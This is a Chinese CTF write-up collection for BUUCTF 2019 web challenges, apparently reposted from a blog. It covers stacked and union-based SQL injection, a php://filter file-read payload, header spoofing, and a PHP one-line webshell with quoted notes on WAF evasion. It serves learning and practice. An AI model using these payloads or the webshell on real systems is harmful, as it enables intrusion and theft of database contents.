`1`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664998585-28a658de-ffeb-4417-8a45-efb1eb80f4a8.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=186&id=u4da01599&originHeight=232&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24755&status=done&style=none&taskId=uaa1a1096-cd48-4975-9a5a-9cd4a963bf0&title=&width=700.8)
> 数字型SQL注入

查所有数据库,采用堆叠注入<br />`1;show databases;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698665929401-d1ed791e-3482-437f-922e-d2013b67d69e.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=175&id=u4356b753&originHeight=219&originWidth=1725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36187&status=done&style=none&taskId=u11f7d0dc-8874-456c-b792-bd23c079d14&title=&width=1380)<br />查看所有数据表<br />`1;show tables;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698733249276-b42032e3-6c64-471b-a9de-6a02dafdec20.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=138&id=u666a75c4&originHeight=172&originWidth=748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10564&status=done&style=none&taskId=ue2f2e90a-b7c3-402f-8ec9-55e97ce2274&title=&width=598.4)<br />尝试爆Flag数据表的字段<br />`1;show columns from Flag;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698736004092-1706d5e8-718a-4c60-b84c-d8138080676f.png#averageHue=%23f5f3f1&clientId=u250485b3-3c63-4&from=paste&height=99&id=udd705357&originHeight=124&originWidth=506&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6587&status=done&style=none&taskId=uc246e44f-a815-4917-8a0b-541bf4ebe3c&title=&width=404.8)
> 回显错误

到这里，大佬们直接猜出了后端语句<br />`select $_GET['query'] || flag from Flag`<br />我直接好家伙，大佬果然是大佬<br />||就是SQL里面的逻辑或运算符<br />**第一种解法 添加新列绕过逻辑或运算符：**<br />`*,1`<br />那么传到后端语句就是<br />`select *,1 || flag from Flag`<br />这里我问了下文心一言，看完我也理解了
> 这段SQL代码的含义是：从Flag表中选择所有的列，以及由列flag的值与数字1进行连接生成的新列。
> 具体来说：
> select *：选择所有的列。
> 1 || flag：这是SQL中的字符串连接操作。它将数字1与flag列的值进行连接。对于每一行，都会生成一个新的字符串，这个字符串是数字1后跟着flag列的值。如果flag列的值本身是一个字符串，那么这两个字符串将被连接起来。
> from Flag：从Flag表中选择数据。
> 因此，这段代码的输出结果将包含Flag表的所有列，以及一个名为“1”的列，该列的值是flag列的值与数字1的连接。

大致意思，就是查看数据表Flag的所有列内容，然后添加了一个由列flag的值与数字1进行连接生成的新列，这个新的列名就叫1，那么猜测或者说就是flag被过滤，我们还能查到flag列的值，因为flag的值复制到了新的列1。<br />`*,0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737425920-147348c3-d409-45b9-9b64-209c06dd4d8a.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=138&id=u45a419d4&originHeight=172&originWidth=896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12977&status=done&style=none&taskId=ub124435b-76cb-4bd6-adb0-d78454b724a&title=&width=716.8)<br />可以明显看到新的列名0和flag的值连接起来了<br />`*,1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737517157-c053430c-0783-483f-88da-60128f6c574b.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=134&id=udcd5aa28&originHeight=168&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11928&status=done&style=none&taskId=u24a871c4-5ee0-488d-ac55-0c5553132bc&title=&width=697.6)<br />对吧，新列名为1<br />`*,2`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737591497-1936851a-330a-466f-a205-11b2f7e39480.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=132&id=uc69c71a0&originHeight=165&originWidth=900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12687&status=done&style=none&taskId=ua5ebc9c4-61a9-45ad-8be0-9b8ba35a996&title=&width=720)<br />还是为1，所有还可以看出Flag数据表的列只能是两个<br />**第二种解法 改逻辑或运算符为字符串连接符：**<br />既然题目内置的是逻辑或运算符，那咱们直接把它改成字符串连接符不就好了嘛（滑稽）<br />使用set方法定义sql_mode参数设置，PIPES_AS_CONCAT字符串连接符`select 1`查询第一列<br />`1;set sql_mode=PIPES_AS_CONCAT;select 1`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698738692889-3662a38c-076f-43de-88a8-67ac47a48fe4.png#averageHue=%23f5f3f0&clientId=u250485b3-3c63-4&from=paste&height=171&id=u8a1c556a&originHeight=214&originWidth=977&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29510&status=done&style=none&taskId=uf50e8da8-0feb-41e0-ae03-bd8c13b3cdc&title=&width=781.6)<br />可以明显看出解法1和解法2的回显结果有明显不同

原文链接：https://blog.csdn.net/m0_73734159/article/details/134142483?spm=1001.2014.3001.5501

## [极客大挑战 2019]Secret File 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802561058-df9dbcb0-c223-4599-bf22-b7825a8b7b79.png#averageHue=%23151313&clientId=u6aca6dec-195b-4&from=paste&height=825&id=u779bc2c2&originHeight=1031&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53498&status=done&style=none&taskId=u947f1f3c-f27b-4381-beb1-cd74d676462&title=&width=1536)
> 网页什么都没有，GET那里也没有任何参数和文件

F12查看隐藏文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802688208-be6d23b9-75c2-40eb-ae11-8c5c3760004e.png#averageHue=%23fcfcfc&clientId=u6aca6dec-195b-4&from=paste&height=830&id=u0860aec4&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70151&status=done&style=none&taskId=u7bf5aabf-05db-4fdc-a9a2-3cb71dc6cf2&title=&width=1536)<br />发现隐藏文件<br />点进去看看<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802788222-bd753c39-1eff-4c6b-b23a-f24202e4a974.png#averageHue=%23171313&clientId=u6aca6dec-195b-4&from=paste&height=825&id=u0378a71f&originHeight=1031&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56080&status=done&style=none&taskId=u4c306f61-256b-4256-a133-191d9de9c33&title=&width=1536)<br />发现一个可点击按钮<br />SECRET<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698802854946-c2b17583-2305-4bf1-910c-915bdd6b9cc6.png#averageHue=%23141313&clientId=u6aca6dec-195b-4&from=paste&height=822&id=u60eb6c89&originHeight=1028&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45786&status=done&style=none&taskId=u111fc2c2-e5ad-4dda-b608-8cec62140f3&title=&width=1535.2)
> 好家伙，什么都没有

这里猜测还有隐藏文件<br />**目录扫描**<br />使用工具dirsearch<br />命令：<br />`python dirsearch.py -u [http://a9c9b5bd-4430-4ffb-88bf-0eec1fa73296.node4.buuoj.cn:81/](http://a9c9b5bd-4430-4ffb-88bf-0eec1fa73296.node4.buuoj.cn:81/)`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804788439-b039270f-8428-4da1-afac-7a7bb9c2912b.png#averageHue=%230f0f0e&clientId=u6aca6dec-195b-4&from=paste&height=772&id=ua217e5a6&originHeight=965&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174156&status=done&style=none&taskId=u422945eb-f5bb-4d5d-be60-c3994387044&title=&width=1536)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804818841-000fecd6-9f08-437c-9285-55a1c2210ac7.png#averageHue=%230c0c0c&clientId=u6aca6dec-195b-4&from=paste&height=841&id=uc1d652c0&originHeight=1051&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210972&status=done&style=none&taskId=u82873de8-e4e8-4ad2-bc2c-3678c058ba1&title=&width=1519.2)<br />发现隐藏文件flag.php<br />补充一点，这里我用御剑没有扫描出来，不知道是什么问题，有知道的师傅还望解答，感谢！<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698804993824-1c0bdc7c-a27c-45b3-827a-0645dc86bcee.png#averageHue=%23f5f5f4&clientId=u6aca6dec-195b-4&from=paste&height=546&id=uddd97f24&originHeight=682&originWidth=926&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50359&status=done&style=none&taskId=u0e3d0f84-b099-433e-a1c1-9aaf51da167&title=&width=740.8)<br />访问flag.php<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698805215622-6277b8d8-f984-478c-90a5-1099c2c10088.png#averageHue=%23161414&clientId=u6aca6dec-195b-4&from=paste&height=821&id=mjAVt&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47930&status=done&style=none&taskId=ud50a1399-b00b-4a4d-a226-6b79885360a&title=&width=1536)<br />有内容但是flag没有显示出来，猜测flag是被编码了，需要用到PHP伪协议，但是不知道具体参数是什么，这里需要抓包<br />**burpsuite抓包**
> **使用火狐浏览器访问题目地址**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806259228-9603c625-93cc-4d80-8e17-fcb117b698f8.png#averageHue=%23b16b14&clientId=u6aca6dec-195b-4&from=paste&height=724&id=uf50db427&originHeight=905&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=318116&status=done&style=none&taskId=u3283df3f-6a08-45f8-8ed8-33b0c4e1ec5&title=&width=1328.8)<br />点击SECRET进行抓包<br />右键后，Repeater进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806416032-9d50525a-4531-491f-9356-a5604b6e82ba.png#averageHue=%23f6f6f6&clientId=u6aca6dec-195b-4&from=paste&height=602&id=u0e3ec928&originHeight=753&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=172200&status=done&style=none&taskId=uc6aea7b8-e32b-48e6-ac7b-9e246273310&title=&width=969.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806467986-3b205469-8fe5-4a4a-9565-d07a6acf717a.png#averageHue=%23f6f6f6&clientId=u6aca6dec-195b-4&from=paste&height=586&id=ua96891c9&originHeight=733&originWidth=1249&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=192498&status=done&style=none&taskId=u2148daad-fe2c-4bc6-af59-5a2a947ef75&title=&width=999.2)<br />访问隐藏文件secr3t.php<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806569686-6ac31c35-f565-4dd4-b5f4-505669086429.png#averageHue=%23fefdfd&clientId=u6aca6dec-195b-4&from=paste&height=558&id=u568efdad&originHeight=698&originWidth=1142&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92793&status=done&style=none&taskId=u0c36c91d-ea42-4657-ad4c-0c364a2f907&title=&width=913.6)<br />strstr函数查询../,tp,input,data在file变量里面是否存在，存在则输出0h no!<br />这对构造PHP伪协议毫无影响<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806818598-5a4461bb-97f7-46c4-84c9-a3273fd53e3a.png#averageHue=%23171515&clientId=u6aca6dec-195b-4&from=paste&height=826&id=ud73ea182&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75072&status=done&style=none&taskId=ud1237276-62a3-4c0d-8b42-1365129878b&title=&width=1536)
> 使用参数file访问flag.php文件
> 回显结果更是表明了flag.php文件内容被编码了

**构造PHP伪协议：**<br />`**php://filter/read=convert.base64-encode/resource=flag.php**`<br />**最终payload：**<br />`**URL/?file=php://filter/read=convert.base64-encode/resource=flag.php**`<br />**回显结果：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698806980194-49f87555-3a9c-43cd-964d-822c6c6d0102.png#averageHue=%23fbfafa&clientId=u6aca6dec-195b-4&from=paste&height=408&id=u02767e88&originHeight=510&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63379&status=done&style=none&taskId=u44a45d63-b891-4d3f-a9bd-a898ef7ecd8&title=&width=1536)<br />可以看到是明显的base64编码格式<br />放到Kali进行base64解码<br />`echo "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTI0OTJhMTktZDhjYi00OGYzLWIwOTctYjM0OGQyNjEwZmExfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=" | base64 -d`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698807140717-f0a0d0ce-9537-4a04-b06a-ba572356ed13.png#averageHue=%23202229&clientId=u6aca6dec-195b-4&from=paste&height=724&id=u766689ae&originHeight=905&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=248164&status=done&style=none&taskId=ufc308ba6-a62a-4a11-9b2b-42be83496e7&title=&width=1328.8)<br />**得出flag：**<br />`flag{e2492a19-d8cb-48f3-b097-b348d2610fa1}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134156801?spm=1001.2014.3001.5501

## [极客大挑战 2019]LoveSQL 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909690636-861c392b-5073-4df5-8a76-4449c01db1c6.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=825&id=u10ec8acf&originHeight=1031&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=597645&status=done&style=none&taskId=u8621b856-cfb9-441c-aba3-1d48365d194&title=&width=1534.4)判断注入类型<br />是否为数字型注入
> `admin`
> `1`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909822674-6098ec0a-53be-4f1d-b49f-b46bf99dbf72.png#averageHue=%23241e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=ufde74f60&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=606286&status=done&style=none&taskId=u3a7a0892-3a22-4e00-a2e6-e1c476a1cf5&title=&width=1536)
> 否

是否为字符型注入
> `admin`
> `1'`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909907759-b0b66239-ffcf-4a5e-a80c-4134772788ab.png#averageHue=%231d1d1d&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=ua7cdc6f2&originHeight=1032&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=608102&status=done&style=none&taskId=ue4086c16-4114-4e3d-b8f4-f18afffe7de&title=&width=1536)
> 是

判断注入手法类型

> 使用堆叠注入
> 采用密码参数进行注入

爆数据库<br />`1'; show database();#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910081201-ec66c41b-491a-4f7f-956f-41c24cf17780.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u6cca4a46&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609596&status=done&style=none&taskId=ubd1cc3e5-f6c7-4fc9-9899-da9eb316751&title=&width=1536)
> 这里猜测注入语句某字段被过滤，或者是';'被过滤导致不能堆叠注入

爆字段数<br />`1';order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910291949-9d34bc6b-f088-43dd-ae34-9cb3d98a6e41.png#averageHue=%231e1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=ue653c0b2&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609461&status=done&style=none&taskId=u014c81be-9a36-4a0c-91c0-a33f4b83262&title=&width=1536)
> 报错
> 抛弃堆叠注入

步入正题<br />`1' order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910383188-ae75dce9-d7c8-4dd4-b815-71fb6ba05d21.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=830&id=u5a0a5819&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=600087&status=done&style=none&taskId=u58510ae9-b899-4664-bbc6-cd4a4a0d405&title=&width=1536)
> 成功，但是不存在第4列
> 同时验证了猜想不能使用堆叠注入

继续判断列数<br />`1' order by 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910478755-1e7e63c9-0354-45a3-abc2-2f6f535e0003.png#averageHue=%23221c1c&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u0c2aade0&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605355&status=done&style=none&taskId=ue936570e-9310-42eb-9dbc-a98cbc98a60&title=&width=1536)
> 可知列数只有3列

爆数据库<br />使用联合查询<br />`1' union select 1,2,database()#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910666459-6a3a6b11-fa82-4b48-ad00-31c05b76c161.png#averageHue=%231f1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=831&id=u731be2bc&originHeight=1039&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=617140&status=done&style=none&taskId=u91b4f4eb-e65b-471e-a60a-1c63c12e91d&title=&width=1536)<br />爆数据表<br />`1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911070730-12c0a4b1-543d-46c5-9f8b-3b8623ab9df2.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=829&id=u7b0fd8e4&originHeight=1036&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=623639&status=done&style=none&taskId=udc09894c-f0b0-4554-92c7-b9b241f8f57&title=&width=1536)
> 爆出两个表
> 开始爆数据表的字段
> 按照先后顺序把，先爆第一个

爆geekuser数据表的字段<br />`1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='geekuser'#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911854728-50b4b69b-1a11-4896-b284-af320e648a7e.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u295cb7ff&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613173&status=done&style=none&taskId=udcf4212e-cce5-446d-8c80-c0856916610&title=&width=1536)
> 字段：id、username、password

爆geekuser数据表的所有内容<br />`1' union select 1,database(),group_concat(id,username,password) from geekuser#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912168291-6e041779-91e5-4a60-a71c-6234905cdde4.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=834&id=u67d2e3eb&originHeight=1042&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=618210&status=done&style=none&taskId=u69c75f31-d772-4757-b782-116847fb745&title=&width=1536)
> 无flag

转手数据表l0ve1ysq1<br />步骤和数据表geekuser一样，这里直接爆数据表l0ve1ysq1的flag值<br />`1' union select 1,database(),group_concat(password) from l0ve1ysq1#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912423460-3c81bdee-fb79-40c6-a33f-77d1ef31e897.png#averageHue=%23242322&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=u6276eb70&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=630684&status=done&style=none&taskId=uad685c97-2037-4584-b5df-0a79cd79221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912445735-b36fc7d2-cb85-49a3-a1bf-e1d6f21d01e5.png#averageHue=%23222222&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u20939a6e&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613901&status=done&style=none&taskId=ua38fbf35-d9a8-422a-b92e-f8170c73537&title=&width=1536)<br />**得出flag：**<br />`flag{3c4b1ff9-6685-4dcb-853e-06093c1e4040}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134185235?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134185235%22%2C%22source%22%3A%22m0_73734159%22%7D

## [极客大挑战 2019]Http 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698990328197-27134373-3f1d-46d6-b10e-3b51bc0b1f09.png#averageHue=%23453934&clientId=u6d992860-e414-4&from=paste&height=760&id=ub39e4f20&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=484193&status=done&style=none&taskId=u6f6dd259-6921-4812-ab3c-5e6cd8ac23b&title=&width=1528.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698990353259-4b9c2656-0b60-40b7-8217-c6fb4ef298bf.png#averageHue=%2330948e&clientId=u6d992860-e414-4&from=paste&height=760&id=u0c8a0784&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=150914&status=done&style=none&taskId=ua96770ea-1d31-47d1-be70-74397369cdb&title=&width=1528.8)
> 看起来挺花里胡哨的

F12查看源代码寻找隐藏文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698990467697-5a94a3a8-3963-41fd-845e-577cd62731c3.png#averageHue=%23fbfafa&clientId=u6d992860-e414-4&from=paste&height=760&id=u5d2ad954&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57015&status=done&style=none&taskId=u99aa9117-c375-4b45-9d7f-b94601bedee&title=&width=1528.8)
> 这是啥子呀，果然防不胜防

点击隐藏文件Secret.php<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698990922187-da1a9199-8aa3-495a-8b56-b0d8b534593c.png#averageHue=%23020202&clientId=u6d992860-e414-4&from=paste&height=758&id=u57fdcfe0&originHeight=948&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=622427&status=done&style=none&taskId=u20a704f7-c6fb-4ddf-abc2-53f75f271db&title=&width=1526.4)
> 它不是来自这个地址的请求
> 报头：https://Sycsecret.buuoj.cn

**需要抓包，在抓包前了解部分数据包参数**
> **GET:到**
> **Host:来自**
> **User-Agent: 用户-代理**
> **Accept: 接受**
> **Accept-Language: 接受-语言**
> **Accept-Encoding: 接受-编码**
> **Connection: 连接**
> **Upgrade-Insecure-Requests: 升级-不安全的-请求**
> **Content-Length: 内容长度**
> **Cache-Control: 缓存-控制**
> **X-Forwarded-For: HTTP的请求端真实的IP**
> **Request: 请求**
> **Response: 响应**
> **Referer：请求报头**

burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698991658580-e48277a4-096b-405a-bc0b-2f4e477ef9ad.png#averageHue=%23aa6a18&clientId=u6d992860-e414-4&from=paste&height=656&id=ue99649d2&originHeight=820&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=510986&status=done&style=none&taskId=uf25b13a0-1f92-4822-b74d-8255361dcbf&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698991715953-d9aceb54-16c0-4e1a-ad4f-3774c0394d5a.png#averageHue=%23aa6918&clientId=u6d992860-e414-4&from=paste&height=658&id=u417bfe17&originHeight=822&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=523200&status=done&style=none&taskId=uecfe4f58-88cb-44f0-8b1f-05c8a1b8aac&title=&width=1374.4)<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698991804022-dc92d090-6c24-4a30-9dff-ea2836e906a0.png#averageHue=%23f9f9f9&clientId=u6d992860-e414-4&from=paste&height=750&id=ua4d38ee7&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174464&status=done&style=none&taskId=u5e9f28b7-d25f-47bb-abd7-4c32ac50822&title=&width=1374.4)<br />右键送去重放<br />添加Referer请求报头<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698991912946-cd4ea991-f6ac-4825-a49d-f4f624c8c82f.png#averageHue=%23f9f9f9&clientId=u6d992860-e414-4&from=paste&height=726&id=u0b6a762c&originHeight=907&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=169293&status=done&style=none&taskId=ub324138f-725a-44d1-b1d2-98c3b52e608&title=&width=1374.4)
> 请使用Syclover浏览器进行访问

修改User-Agent用户代理为Syclover浏览器<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698992282241-b1518884-034a-41b7-be7d-66c87b77272d.png#averageHue=%23f9f9f8&clientId=u6d992860-e414-4&from=paste&height=729&id=ue75a0681&originHeight=911&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=180576&status=done&style=none&taskId=ub516417a-7799-40e1-b75e-2fb021d2360&title=&width=1374.4)
> No!!! you can only read this locally!!!
> 不! ! ! 你只能在本地阅读! ! ！

查看请求端本地的真实IP<br />Kali终端输命令**ifconfig**,箭头后面即为真实IP<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698992543612-8fa5d47e-e002-4220-aefb-ba75add21881.png#averageHue=%231c1f28&clientId=u6d992860-e414-4&from=paste&height=538&id=u97263fe4&originHeight=672&originWidth=144&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42040&status=done&style=none&taskId=u48a1cf09-6933-4c7f-b978-e004cbe90d3&title=&width=115.2)<br />添加X-Forwarded-For请求端本地真实的IP<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698992673812-03aed018-25f5-47bf-abb9-48aaa8e4988a.png#averageHue=%23f9f9f9&clientId=u6d992860-e414-4&from=paste&height=727&id=u8f49b4b8&originHeight=909&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182061&status=done&style=none&taskId=u6ced2fd6-f039-4f41-965b-3eae8bdf979&title=&width=1374.4)<br />**得到flag：**<br />`flag{a165c953-c9d8-4d9d-9ee6-39390b05d903}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134202493?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134202493%22%2C%22source%22%3A%22m0_73734159%22%7D

## [极客大挑战 2019]Knife 1（两种解法）

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699102398967-1c673a5a-c5ba-42c7-9dd4-24c1bf9eb6e0.png#averageHue=%23161514&clientId=uec6e18bd-ad37-4&from=paste&height=831&id=u99b8efe8&originHeight=1039&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61282&status=done&style=none&taskId=ub79d083f-737d-4701-82fc-2a35ad2648e&title=&width=1526.4)
> 这道题主要考察中国菜刀和中国蚁剑的使用方法
> 以及对PHP一句话木马的理解
> 咱们先了解一下PHP一句话木马，好吗？

`**eval($_POST["Syc"]);**`
> **eval是PHP代码执行函数，**把字符串按照 PHP 代码来执行。
> $_POST PHP方法将参数Syc作为POST传参方式
> 可以理解为题目作者已经给我们了连接服务器的密码Syc，我们只需要使用工具连接题目地址就可以啦

**一句话木马原理（来自文心一言）**
> 一句话木马是一种精简但高效的木马，只需要一行代码即可实现和大马（全功能木马）相当的功能。其特点是短小精悍，可以用来绕过WAF（Web Application Firewall）的检测。
> 一句话木马通常通过GET、POST、COOKIE这三种方式向一个网站提交数据，并利用PHP的eval函数将接收到的数据当作PHP代码来执行。例如，以下是一个经典的一句话木马：eval(base64_decode(''));，其中eval是执行命令的函数，base64_decode('')是将传递的数据解码为PHP代码的部分。
> 为了绕过WAF的检测，一句话木马出现了无数种变形，但本质是不变的：木马的函数执行了我们发送的命令。由于其高度的灵活性和隐蔽性，一句话木马经常被用于进行恶意攻击，如窃取敏感数据、实施CC攻击等。
